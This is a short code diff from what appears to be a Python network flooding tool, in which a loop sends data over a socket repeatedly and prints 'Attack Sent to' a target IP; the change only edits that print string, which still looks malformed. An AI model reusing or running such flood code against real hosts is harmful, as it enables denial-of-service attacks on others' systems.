@@ -87,7 +87,7 @@ def run():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(" [💥]  \033[32m" +str(u)+ " \033[31mZ0NA R2 \033[34mAttack Sent to \033[94m" +ip+ ")
+			print(" [💥]  \033[32m" +str(u)+ " \033[31mZ0NA R2 \033[34mAttack Sent to \033[94m" +ip+ ".")
 		except:
 			s.close()
 			print("[*] Error!!!")
